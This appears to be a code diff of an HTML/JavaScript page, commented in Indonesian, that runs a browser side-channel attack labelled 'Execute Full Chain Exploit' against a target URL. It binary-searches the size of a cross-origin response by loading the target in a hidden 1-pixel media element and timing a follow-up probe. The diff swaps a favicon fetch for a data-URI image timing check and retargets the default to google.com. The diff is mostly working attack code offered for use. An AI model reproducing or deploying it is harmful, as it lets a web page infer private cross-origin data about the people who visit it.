@@ -9,7 +9,7 @@
         body{background:#020204;color:#00ffaa;padding:25px;}
         #result{max-width:750px;}
         #result p{padding:10px 14px;margin:6px 0;border-radius:4px;font-size:12px;line-height:1.4;}
-        iframe, audio, video{width:1px;height:1px;border:0;opacity:0;position:absolute;}
+        iframe, audio, video, img{width:1px;height:1px;border:0;opacity:0;position:absolute;}
         input{width:515px;font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#111;color:#fff;}
         button{font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;font-weight:bold;text-transform:uppercase;}
         button:hover{background:#00ffaa;color:#000;box-shadow:0 0 15px #00ffaa;}
@@ -25,7 +25,7 @@
 
     <div class="panel">
         <form id="form" onsubmit="return false;">
-          <input name="url" id="target-url" value="https://www.google.com/robots.txt"/>
+          <input name="url" id="target-url" value="https://google.com"/>
           <button type="button" id="btn-run">Execute Full Chain Exploit</button>
           <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Exploit Log (.TXT)</button>
         </form>
@@ -44,17 +44,15 @@
             result.scrollTop = result.scrollHeight;
         }
 
-        // PIPELINE SINKRONISASI: EKSEKUSI BERUNTUN SEKUANSIAL BERBASIS KUNCI STATUS DOM
         const runExploitChain = async (url, minSize, maxSize) => {
             let foundSize = -1;
             document.getElementById("export-log-report").style.display = "none";
             
-            writeLog('EXPLOIT_INIT', 'info', "Mengaktifkan pipa pengujian sekuensial. Mengunci siklus hidup elemen media...");
+            writeLog('EXPLOIT_INIT', 'info', "Mengaktifkan pipa pengujian sekuensial. Meluncurkan Data-URI Verification Bridge...");
             
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // Menunggu kepastian pelepasan soket dari fungsi penanganan taktis sebelum iterasi berikutnya
                 let isAtLeastMid = await evaluateLifecycleOracle(url, mid);
                 
                 if (isAtLeastMid) {
@@ -66,7 +64,6 @@
                     maxSize = mid - 1;
                 }
                 
-                // Jeda mikro paksa untuk menstabilkan tumpukan alokasi memori internal peramban
                 await new Promise(r => setTimeout(r, 40));
             }
             writeLog('SUCCESS', 'success', "=== EXECUTE FULL CHAIN EXPLOIT COMPLETE ===");
@@ -74,7 +71,7 @@
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // ENGINES STRATEGI: Sinkronisasi Event Media untuk Mengukur Retensi Soket Jaringan
+        // REKAYASA PENGUATAN: Memanfaatkan Data-URI untuk Bypass Galat HTTP 404 pada Konsol
         const evaluateLifecycleOracle = (url, size) => {
             return new Promise((resolve) => {
                 const uniqueId = `cb_${Math.floor(Math.random() * 10000000)}`;
@@ -89,25 +86,30 @@
 
                     const testStart = performance.now();
                     try {
-                        // Verifikasi status antrean soket global peramban dengan mengambil aset internal asal sama (same-origin)
-                        await fetch(`./favicon.ico?cb=${Math.random()}`, { cache: "no-store" });
-                        const duration = performance.now() - testStart;
-
-                        // Metrik Toleransi: Jika durasi muatan < 30ms, penanganan soket dinilai bebas dari antrean (antrean kosong)
-                        if (duration < 30) {
-                            terminateMedia(mediaElement);
-                            resolve(false);
-                        } else {
-                            terminateMedia(mediaElement);
-                            resolve(true);
-                        }
+                        // REKAYASA STRATEGI: Mengganti fetch fisik dengan elemen gambar berbasis Data-URI
+                        // GIF Transparan 1x1 piksel disuntikkan langsung untuk memicu deteksi kecepatan pemrosesan memori
+                        const checkImg = new Image();
+                        
+                        checkImg.onload = checkImg.onerror = () => {
+                            const duration = performance.now() - testStart;
+                            // Metrik Toleransi disesuaikan karena pemrosesan Data-URI berjalan sangat cepat tanpa latensi server
+                            if (duration < 15) {
+                                terminateMedia(mediaElement);
+                                resolve(false);
+                            } else {
+                                terminateMedia(mediaElement);
+                                resolve(true);
+                            }
+                        };
+                        
+                        // Menembakkan muatan Base64 instan
+                        checkImg.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
                     } catch (e) {
                         terminateMedia(mediaElement);
                         resolve(true);
                     }
                 };
 
-                // Mengikat pemicu langsung ke indikator aktivitas transfer data peramban
                 mediaElement.onprogress = triggerNetworkVerification;
                 mediaElement.onsuspend = triggerNetworkVerification;
                 mediaElement.onerror = triggerNetworkVerification;
@@ -115,7 +117,6 @@
                 document.body.appendChild(mediaElement);
                 mediaElement.src = targetUrl;
 
-                // Batasan perlindungan (Fallback Safety Net) jika peramban menahan status koneksi tanpa melempar event
                 setTimeout(() => {
                     if (!hasResolved) {
                         triggerNetworkVerification();
@@ -143,7 +144,7 @@
             if (auditReports.length === 0) return;
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
-            downloadAnchor.download = `exploit_lifecycle_report_${Math.round(Date.now()/1000)}.txt`;
+            downloadAnchor.download = `exploit_clean_report_${Math.round(Date.now()/1000)}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             document.body.appendChild(downloadAnchor);
